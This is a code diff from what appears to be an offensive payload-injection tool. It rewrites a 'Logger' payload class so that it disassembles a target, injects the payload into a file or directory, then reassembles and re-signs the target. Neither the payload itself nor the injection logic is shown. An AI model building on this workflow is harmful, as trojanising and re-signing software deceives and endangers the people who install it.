@@ -17,7 +17,10 @@ import time
 
 from metadata import metadata
 from payloads.payload import Payload
-from utils import info, register
+from reverse_engineer import reverse_engineer
+from utils import logger, register
+
+logger = logger.get_logger()
 
 
 class Logger(Payload):
@@ -25,21 +28,28 @@ class Logger(Payload):
         Payload.__init__(self, args)
 
     def run(self):
-        self.export_payload(self.destination)
+        logger.info("disassembling...")
+        logger.warning("this operation might take some time")
+        reverse_engineer.disassemble(self)
 
+        logger.info("exporting payload...")
+        self.export_payload()
+
+        logger.info("injecting...")
         if (os.path.isdir(self.destination)):
             dir_metadata = metadata.generate_dir_metadata(self.destination)
             self.inject_in_dir(dir_metadata)
-
-            # Displays result information
-            return info.get_dir_info(self, dir_metadata)
 
         elif (os.path.isfile(self.destination)):
             file_metadata = metadata.generate_file_metadata(self.destination)
             self.inject(self.destination, file_metadata)
 
-            # Displays result information
-            return info.get_file_info(self, file_metadata)
+        logger.info("reassembling...")
+        logger.warning("this operation might take some time")
+        reverse_engineer.reassemble(self)
+
+        logger.info("signing...")
+        reverse_engineer.sign(self)
 
     def inject(self, file_path, file_metadata):
         """
